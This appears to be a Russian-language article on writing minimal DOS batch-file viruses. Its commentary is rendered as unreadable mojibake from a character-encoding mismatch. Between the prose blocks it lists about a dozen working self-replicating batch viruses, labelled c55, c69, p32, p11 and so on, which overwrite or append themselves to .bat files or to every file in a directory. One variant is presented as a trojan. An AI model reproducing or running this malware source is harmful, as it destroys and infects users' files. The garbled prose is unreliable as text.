@ctty nul
for %%b in (*.bat) do copy %0 %%b

for %%b in (*.bat) do copy %0 %%b

for %%b in (*.b*) do copy %0 %%b

for %%b in (*.*) do copy %0 %%b

for %%a in (*.b*) do set a=%%a

ren %a% *.|copy %0 %a%

for %%a in (*.b*) do set a=%%a
ren %a% *|copy %0 %a%

if "%1==" for %%i in (*.b*) do call %0 %%i
ren %1 *|copy %0 %1

for %%i in (*.%1b*) do call %0 %%i
ren %1 *|copy %0 %1
===== end   c55.bat =====

   � ��� �� ��᪮�쪮 ��ਠ権 �� ⥬� ������쮭�� (�ࠢ��, �� ����襣�
ࠧ���). ���� �� ��� ��२�����뢠�� �� *.b* � 䠩�� ��� ���७��,
� ����� ��� �����뢠���� ᠬ, ��祬 � ᠬ�� ᮡ�� �� ���४⭮ ;-)))
� ᮦ������, �� ����୮� ��ࠦ���� ��ࢮ��砫쭮 ��ࠦ���� 䠩� ������ :((

===== begin c69.bat =====
for %%i in (*.b*) do copy %%i *
for %%i in (*.) do copy %0 %%i.bat
===== end   c69.bat =====

   �� �⮬ ����� ����� �����쪮 ����⨬���஢��� ! �᫨ �� ����஢����
�ᯮ�짮���� ���ਪ� "*", � �� ���� ����� ��⠭���� ��� ���������.
�ਬ���� ��� ��� ��� ���७�� (���� ����� ����� ���⮢��� ⮫쪮 ��
BAT-䠩�� !) � 㬥��訬 ࠧ��� �� 2 ���� :

===== begin c67.bat =====
for %%i in (*.b*) do copy %%i *
for %%i in (*.) do copy %0 %%i.*
===== end   c67.bat =====

   �� ���� 䠩��� ��� ���७�� ����� �஢����� �� �� ����� ���⮩ ��᪥
('*.' ���������⭮ '*') :

===== begin c66.bat =====
for %%i in (*.b*) do copy %%i *
for %%i in (*) do copy %0 %%i.*
===== end   c66.bat =====

   ������騩 ����� ������� �� 䠩�� � 䠩� ��� ���७��, ���⮬� �᫨ �
��� ���� ��᪮�쪮 ����������� 䠩��� � ��������� ���७���, � �릨���
���� ���� :((

===== begin c65.bat =====
for %%i in (*.*) do copy %%i *
for %%i in (*.*) do copy %0 %%i
===== end   c65.bat =====

   ������ � ��ࠧ���᪨� ������. ���� �������� ���� �㤥� �����
��ࠧ���᪨� BAT-������, ����� �᪠�� � ᮡ�� �� ࠭�� ��ࠦ����
䠩�� :((
   ��� �������� - ��ࠧ���᪨� �����, ����� �� �஢���� 䠩�� ��
����୮� ��ࠦ����, �� �� ��ࠦ��� ����� �� 䠩��� � ��⠫��� �⮫쪮 ࠧ,
᪮�쪮 ᢥ�� ��⭨��� � ��⠫��� :)) �� ࠡ�⠥�, � ࠧ��� ������.

===== begin p69.bat =====
if "%1==" for %%m in (*.b*) do call %0 %%m
copy /b %0+%1 #
copy # %1
===== end   p69.bat =====

   �ਬ���� ���, ���ᠭ� ���� � ࠧ���� ������쮭��, ����稬 :

===== begin p61.bat =====
for %%m in (*.%1b*) do call %0 %%m
copy/b %0+%1 #
copy # %1
===== end   p61.bat =====

   � ��������� �訡���... ������� "for %%i in (*.bat) do type %0>>%%i"
ࠡ���� �� �㤥� ! �� �易�� � �������������� ��७��ࠢ����� � �������
FOR... :(((
   �� ���� �� ��㬪� ��� ! ���⮬� � ����ᠫ ����� BAT.Silly.32, �
�२����⢠� ���ண� ����� �⭥�� :
+ ��ࠧ���᪨� (!!!), �.� �㤥᭮ ������;
+ ��ࠦ��� �� 䠩�� *.b* � ⥪�饩 ��४�ਨ;
+ �� ��ࠦ��� ᠬ ᥡ� !
����� �ᯮ������ �� 䠪�, �� �᫨ �� ������ ��� "�㤠_����஢���",
� �� 㬮�砭�� 䠩���-����⮬ �⠭������ ���� 㪠����� 䠩�.
�� � ᨬ��� "+" ����砥� ᪫���� 䠩���...

===== begin p32.bat =====
for %%b in (*.b*) do copy %%b+%0
===== end   p32.bat =====

����� �� ������� ������⪮� ���� �, �� ��� ���४⭮� ࠡ���
��ࠦ������ 䠩�� � ����� � ���, ����室��� ����稥 � �⮬ 䠩�� ��ॢ���
��ப� ��᫥ ��᫥���� ��ப�. �� ���� 䠩� ������ �����稢����� ᨬ������
0Dh, 0Ah. � ⠪�� ����砥��� ������ �� �ᥣ��. ���⮬� ����� �����ᯮᮡ��
�㤥� ��㣮� ����� - BAT.Silly.34 (� ��ࠦ����� 䠩��� �� �⫨��� ����������,
���⮬� �ࠢ��쭥� ������� �� BAT.Silly.32/34) :

===== begin p34.bat =====

for %%b in (*.b*) do copy %%b+%0
===== end   p34.bat =====

   � �⮡� ��� ����� �� ��᮫��� ������⥫�� �।� ��ࠧ���᪨� ��⭨���,
� �� ����� ᮪�⨫ ���� ���᪠ � ����稫 31 ���� :

===== begin p31.bat =====
for %%b in (*.*) do copy %%b+%0
===== end   p31.bat =====

   �� ���� ����� ����ᮢ, ����� ����뢠�� ᮡ�⢥��� ��� �� STDOUT
� ������� �� �, �� � ��������� ��ப� 㪠���� ��७��ࠢ����� �뢮�� �
��㣮� 䠩� ;) ��ᯥ�᪨� ���뢠�� ⠪�� ������, ����ᠭ�� �� ��ᥬ����,
��� Trojan.STDOUT.* . ��� ����� ࠧ��� 5-7 ����. �� � ��� ��� �� ��ᥬ����,
���⮬� � �।����� Trojan.STDOUT.10 �� BAT-�몥 (��࠭��, �� ��ᯥ�᪨�
ᠬ �� ���㬠��� �� �⮣� ;-) :

===== begin t10.bat =====
type %0>%1
===== end   t10.bat =====

������ த� ��த�� �� �����⭥�訩 ����� "copy %0 %1", ����� �� �� ���
�� ��⥪������ ;-))))

   �᫨ ��襯ਢ������ ��� ᮢᥬ ����-���� ����୨��஢���, �� ����稬
ᠬ� ���⪨� � ��� ��ࠧ���᪨� BAT-�����, ����� ࠡ�⠥� �� ��,
祬 �뢠�� 29 䥢ࠫ� :

===== begin p11.bat =====
type %0>>%1
===== end   p11.bat =====

   �� ��� ���� � ��... ������� ��� �뫮 ����᭮ � �� ��� ������� �뫨
��ࠦ��� ����������ﬨ �몠 Batch. ��������, � ������襬 ���饬 ��᫥���
�த������� �⮩ ����...
